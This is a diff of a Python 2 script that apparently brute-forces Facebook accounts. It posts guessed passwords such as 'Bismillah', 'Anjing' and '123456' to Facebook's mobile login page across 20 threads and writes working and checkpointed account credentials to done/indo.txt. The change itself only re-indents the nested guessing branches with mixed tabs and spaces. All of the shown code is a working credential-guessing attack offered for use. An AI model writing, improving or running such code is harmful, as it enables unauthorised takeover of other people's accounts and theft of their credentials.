@@ -424,57 +424,57 @@ def pilih_indo():
 											cek.write('\n[CP] '+em+' | '+pw4)
 											cek.close()
 											cekpoint.append(em)
-                                        else:
-                                            pw5 = 'Bismillah'
-                                            rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
-                                            xo = rex.content
-                                            if 'mbasic_logout_button' in xo or 'save-device' in xo:
-                                                print '\033[0;97m[OK]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw5
-                                                oke = open('done/indo.txt', 'a')
-                                                oke.write('\n[OK] '+em+' | '+pw5)
-                                                oke.close()
-                                                oks.append(em)
-                                            else:
-                                                if 'checkpoint' in xo:
-                                                    print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw5
-                                                    cek = open('done/indo.txt', 'a')
-                                                    cek.write('\n[CP] '+em+' | '+pw5)
-                                                    cek.close()
-                                                    cekpoint.append(em)
-                                                else:
-                                                    pw6 = 'Anjing'
-                                                    rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw6, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
-                                                    xo = rex.content
-                                                    if 'mbasic_logout_button' in xo or 'save-device' in xo:
-                                                        print '\033[0;97m[OK]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw6
-                                                        oke = open('done/indo.txt', 'a')
-                                                        oke.write('\n[OK] '+em+' | '+pw6)
-                                                        oke.close()
-                                                           oks.append(em)
-                                                    else:
-                                                        if 'checkpoint' in xo:
-                                                            print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw6
-                                                            cek = open('done/indo.txt', 'a')
-                                                            cek.write('\n[CP] '+em+' | '+pw6)
-                                                            cek.close()
-                                                            cekpoint.append(em)
-                                                        else:
-                                                            pw7 = '123456'
-                                                            rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw7, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
-                                                            xo = rex.content
-                                                            if 'mbasic_logout_button' in xo or 'save-device' in xo:
-                                                                print '\033[0;97m[OK]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw7
-                                                                oke = open('done/indo.txt', 'a')
-                                                                oke.write('\n[OK] '+em+' | '+pw7)
-                                                                oke.close()
-                                                                oks.append(em)
-                                                            else:
-                                                                if 'checkpoint' in xo:
-                                                                    print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw7
-                                                                    cek = open('done/indo.txt', 'a')
-                                                                    cek.write('\n[CP] '+em+' | '+pw7)
-                                                                    cek.close()
-                                                                    cekpoint.append(em)
+                                        					else:
+                                          					 	pw5 = 'Bismillah'
+                                           					 	rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
+                                          					  	xo = rex.content
+                                          					  	if 'mbasic_logout_button' in xo or 'save-device' in xo:
+                                            					    		print '\033[0;97m[OK]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw5
+                                           				     			oke = open('done/indo.txt', 'a')
+                                             			   				oke.write('\n[OK] '+em+' | '+pw5)
+                                             			   				oke.close()
+                                             				   			oks.append(em)
+                                         				   		else:
+                                          				      			if 'checkpoint' in xo:
+                                            			        				print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw5
+                                             			       					cek = open('done/indo.txt', 'a')
+                                              			      					cek.write('\n[CP] '+em+' | '+pw5)
+									    				cek.close()
+									    				cekpoint.append(em)
+                                              				  			else:
+                                               			     					pw6 = 'Anjing'
+                                               				     				rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw6, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
+                                                			    				xo = rex.content
+                                                			    				if 'mbasic_logout_button' in xo or 'save-device' in xo:
+                                                  				      				print '\033[0;97m[OK]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw6
+                                                  			      					oke = open('done/indo.txt', 'a')
+                                                 			       					oke.write('\n[OK] '+em+' | '+pw6)
+                                                 			       					oke.close()
+                                                  			         				oks.append(em)
+                                                 			   				else:
+                                                  				      				if 'checkpoint' in xo:
+                                                   				         				print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw6
+                                                    			        					cek = open('done/indo.txt', 'a')
+                                                    			        					cek.write('\n[CP] '+em+' | '+pw6)
+                                                     				       					cek.close()
+										    					cekpoint.append(em)
+                                                      				  				else:
+                                                      			      						pw7 = '123456'
+                                                       			     						rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw7, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
+                                                       			     						xo = rex.content
+                                                        			    					if 'mbasic_logout_button' in xo or 'save-device' in xo:
+                                                        			        					print '\033[0;97m[OK]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw7
+                                                         			       						oke = open('done/indo.txt', 'a')
+                                                         		       							oke.write('\n[OK] '+em+' | '+pw7)
+                                                         		       							oke.close()
+                                                         		       							oks.append(em)
+                                                        			    					else:
+                                                         			       						if 'checkpoint' in xo:
+                                                                		    							print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw7
+                                                          		          							cek = open('done/indo.txt', 'a')
+                                                          		          							cek.write('\n[CP] '+em+' | '+pw7)
+                                                          		          							cek.close()
+                                                           			         						cekpoint.append(em)
 		except:
 			pass
 	p = ThreadPool(20)
